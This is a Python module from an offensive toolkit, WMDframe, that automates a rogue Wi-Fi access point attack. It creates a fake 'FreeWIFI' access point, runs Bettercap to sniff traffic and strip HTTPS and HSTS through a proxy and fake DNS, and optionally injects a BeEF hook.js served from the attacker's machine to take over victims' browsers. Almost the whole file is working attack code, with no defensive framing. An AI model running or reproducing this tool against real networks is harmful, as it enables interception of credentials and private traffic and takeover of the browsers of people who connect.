#!/usr/bin/env python3
#
# MIT - (c) 2016 ThomasTJ (TTJ)
# Module for WMDframe


# LIBRARIES
import configparser
import os                   # Running bettercap
from time import sleep      # Just counting down before launch
try:
    from core.colors import bc as bc
    import core.modules as cmodules
    import core.commands as comm
except:
    import sys
    sys.path.append('././')
    from core.colors import bc as bc
    import core.modules as cmodules
    import core.commands as comm
# END LIBRARIES


config = configparser.ConfigParser()
config.read('core/config.ini')


# VARIABLES
BETTERCAP = (config['TOOLS']['BETTERCAP_SYM'])
CREATEAP = (config['TOOLS']['CREATEAP_SYM'])
BEEF = (config['TOOLS']['BEEF_SYM'])
INTERFACE_NET = (config['NETWORK']['INTERFACE_NET'])
INTERFACE_MON = (config['NETWORK']['INTERFACE_MON'])
# END VARIABLES


# OPTIONS
class options():
    Author = "Thomas TJ (TTJ)"
    Name = 'AP sniff'
    Call = 'apsniff'
    Modulename = "aut_ap_sniff"
    Category = 'sniff'
    Type = 'aut'
    Version = "0.1"
    License = "MIT"
    Description = "Create AP and sniff HTTPS and avoid HSTS + Beef"
    Datecreation = "30/11/2016"
    Lastmodified = "30/11/2016"

    def __init__(self, interface_n, interface_s, gateway, sniffer, proxy, target, sniff_log, ap_name, ap_log, args_ap, args_sniff, beef):
        self.interface_n = interface_n
        self.interface_s = interface_s
        self.gateway = gateway
        self.sniffer = sniffer
        self.proxy = proxy
        self.target = target
        self.sniff_log = sniff_log
        self.ap_name = ap_name
        self.ap_log = ap_log
        self.beef = beef
        self.args_ap = args_ap
        self.args_sniff = args_sniff
        self.show_all()

    # Possible options
    def poss_opt(self):
        return ('interface_n', 'interface_s', 'gateway', 'sniffer', 'proxy', 'target', 'sniff_log', 'ap_name', 'ap_log', 'beef', 'args_ap', 'args_sniff')

    # Show options
    def show_opt(self):
        print(
            ""
            + "\n\t" + bc.OKBLUE + ("%-*s %-*s %-*s %s" % (15, "OPTION", 6, "RQ", 15, "VALUE", "DESCRIPTION")) + bc.ENDC
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "------", 6, "--", 15, "-----", "-----------"))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "interface_n:", 6, "y", 15, self.interface_n, 'Active interface for net-connection (normally cable/wifi)'))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "interface_s:", 6, "y", 15, self.interface_s, 'Interface for wifi (needs to able to goto monitor mode)'))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "gateway:", 6, "y", 15, self.gateway, 'Gateway, e.g. 192.168.1.1'))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "sniffer:", 6, "n", 15, self.sniffer, "Activate sniffer - why not? (y/n)"))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "proxy:", 6, "n", 15, self.proxy, "Downgrade HTTPS to HTTP for sniffing (y/n)"))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "target:", 6, "n", 15, self.target, "Target IPs. Separate with ',' or subnet xx\\24"))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "sniff_log:", 6, "n", 15, self.sniff_log, "Logfile for sniffed packets"))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "ap_name:", 6, "n", 15, self.ap_name, "Name for AP (accesspoint)"))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "ap_log:", 6, "n", 15, self.ap_log, "Logfile for AP (accesspoint)"))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "beef:", 6, "n", 15, self.beef, "Inject BEEF for browser takeover (y/n)"))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "args_ap:", 6, "n", 15, self.args_ap, "Free arguments for create_ap"))
            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "args_sniff:", 6, "n", 15, self.args_sniff, "Free arguments for Bettercap"))
            + "\n"
            )

    # Show commands
    def show_commands(self):
        print(
            ""
            + "\n\t" + bc.OKBLUE + "COMMANDS:" + bc.ENDC
            + "\n\t" + "---------"
            + "\n\t" + ("%-*s ->\t%s" % (9, "run", "Run the script"))
            # + "\n\t" + ("%-*s ->\t%s" % (9, "runcom", "Run program with specific arguments"))
            + "\n\t" + ("%-*s ->\t%s" % (9, "info", "Information"))
            + "\n\t" + ("%-*s ->\t%s" % (9, "help", "Help"))
            + "\n\t" + ("%-*s ->\t%s" % (9, "pd", "Predefined arguments for 'runcom'"))
            + "\n\t" + ("%-*s ->\t%s" % (9, "so", "Show options"))
            + "\n\t" + ("%-*s ->\t%s" % (9, "sa", "Show module info"))
            + "\n\t" + ("%-*s ->\t%s" % (9, "exit", "Exit"))
            + "\n"
            )

    # Show all info
    def show_all(self):
        cmodules.showModuleData(
            options.Author,
            options.Name,
            options.Call,
            options.Category,
            options.Type,
            options.Version,
            options.Description,
            options.License,
            options.Datecreation,
            options.Lastmodified
            )
        self.show_commands()
        self.show_opt()
# END OPTIONS


# RUN BETTERCAP
def run():
    # Start the AP
    command = (CREATEAP + ' -m bridge -g ' + sop.gateway + ' ' + sop.interface_s + ' ' + sop.interface_n + ' ' + sop.ap_name + ' ')

    if sop.args_ap:
        command += sop.args_ap + ' '

    if sop.ap_log:
        command += '>> logs/' + sop.ap_log

    print(
        "\n"
        + "\t" + "Loading     : Create_ap"
        + "\n\t" + "Command     : " + bc.BOLD + command + bc.ENDC
        + "\n\t" + "Starting in : 2 seconds"
        + "\n\t"
        )
    sleep(2)
    comm.runCommand(command, 'Create_AP_with_create_ap')

    if sop.beef == 'y':
        comm.runCommand3('beef', 'Start_beef')
        local_ip = comm.getLocalIP(sop.interface_n)
        print('\t[!]  Check the beef window and insert path to "hook.js"')
        print('\t[!]  Press enter to select: "http://' + local_ip[0] + ':3000/hook.js"')
        beef_js_path = input("\t->  " + bc.WARN + "wmd" + bc.ENDC + "@" + bc.WARN + "hook.js path:" + bc.ENDC + " ")
        if not beef_js_path:
            beef_js_path = 'http://' + local_ip[0] + ':3000/hook.js'
        bettercap_beef_arg = '--proxy-module injectjs --js-url "' + beef_js_path + '" '

    # Start bettercap
    if getattr(sop, 'interface_n'):
        opt_com = '--interface ' + getattr(sop, 'interface_n') + ' '

    if getattr(sop, 'gateway'):
        opt_com += '--gateway ' + getattr(sop, 'gateway') + ' '

    if getattr(sop, 'target'):
        opt_com += '--target ' + getattr(sop, 'target') + ' '

    if getattr(sop, 'sniffer').lower() == 'y':
        opt_com += '--sniffer' + ' '

    if getattr(sop, 'proxy').lower() == 'y':
        opt_com += '--proxy' + ' '

    if getattr(sop, 'sniff_log'):
        opt_com += '--log ' + getattr(sop, 'sniff_log') + ' --log-timestamp' + ' '

    if beef_js_path:
        opt_com += bettercap_beef_arg

    if sop.args_sniff:
        opt_com += sop.args_sniff

    command = (BETTERCAP + ' ' + opt_com)
    print(
        "\n"
        + "\t" + "Loading     : Bettercap"
        + "\n\t" + "Command     : " + bc.BOLD + command + bc.ENDC
        + "\n\t" + "Starting in : 2 seconds"
        + "\n\t"
        )
    sleep(2)
    comm.runCommand2(command, 'Bettercap_sniff')

    print(
        "\n"
        + "\t" + "Status\t : Running"
        + "\n\t" + "Stop\t : Manually close X"
        + '\n'
        + "\n\t" + 'Type "back" to return to the main menu'
        + "\n"
        )
    print("   -> " + bc.FAIL + "wmd" + bc.ENDC + "@" + bc.FAIL + "APsniff:" + bc.ENDC + " Module is RUNNING")
# END BETTERCAP


def info():
    print('''
        This module consist of 3 programs:
         * Bettercap for sniffing packets
         * Create_ap for creating virtual accesspoint
         * Beef for injecting malicious js and accessing browser (optional)

        Bettercap will avoid the HSTS and SSL by using a HTTP proxy and fake DNS.

    ''')


# CONSOLE
def console():
    value = input("   -> " + bc.FAIL + "wmd" + bc.ENDC + "@" + bc.FAIL + "APsniff:" + bc.ENDC + " ")
    userinput = value.split()
    if 'so' in userinput[:1]:
        sop.show_opt()
    elif 'sa' in userinput[:1]:
        sop.show_all()
    elif 'help' in userinput[:1]:
        print('\n\n###########################################################')
        print('#  CREATE_AP')
        print('###########################################################\n')
        os.system(CREATEAP + ' --help')
        print('\n\n###########################################################')
        print('#  BETTERCAP')
        print('###########################################################\n')
        os.system(BETTERCAP + ' --help')
        print('\n\n###########################################################')
        print('#  BEEF')
        print('###########################################################\n')
        os.system(BEEF + ' --help')
        print('\n\n###########################################################\n\n')
    elif 'info' in userinput[:1]:
        info()
    elif 'run' in userinput[:1]:
        run()
    elif 'set' in userinput[:1]:
        useroption = str(userinput[1:2]).strip('[]\'')
        uservalue = str(userinput[2:3]).strip('[]\'')
        if useroption not in sop.poss_opt():
            print(bc.WARN + "\n    Error, no options for: " + useroption + "\n" + bc.ENDC)
        elif useroption in sop.poss_opt():
            setattr(sop, useroption, uservalue)
            print('\n      ' + useroption + '\t> ' + uservalue + "\n")
    elif 'back' in userinput[:1] or 'exit' in userinput[:1]:
        return None
    else:
        command = str(userinput[:1]).strip('[]\'')
        print(bc.WARN + "\n    Error, no options for: " + command + "\n" + bc.ENDC)
    console()
# END console


# STARTER
def main():
    print('\n')
    print('\t    ___    ____                         _ ________  ')
    print('\t   /   |  / __ \     __     _________  (_) __/ __/  ')
    print('\t  / /| | / /_/ /  __/ /_   / ___/ __ \/ / /_/ /_    ')
    print('\t / ___ |/ ____/  /_  __/  (__  ) / / / / __/ __/    ')
    print('\t/_/  |_/_/        /_/    /____/_/ /_/_/_/ /_/       ')
    print('\n')
    if os.getuid() != 0:
        print("r00tness is needed due to packet sniffing!")
        print("Run the script again as root/sudo")
        return None
    print('\n')
    print('\t' + bc.OKBLUE + 'CHECKING REQUIREMENTS' + bc.ENDC)
    comm.checkInstalled(BETTERCAP)
    comm.checkInstalled(CREATEAP)
    comm.checkInstalledOpt(BEEF)
    comm.checkNetConnectionV()
    print('\n')
    gateway = comm.getGateway()
    global sop
    sop = options(INTERFACE_NET, INTERFACE_MON, gateway, 'ARP', 'y', '', 'logs/sniff_log.txt', 'FreeWIFI', 'logs/ap_log.txt', '', '', '')
    console()
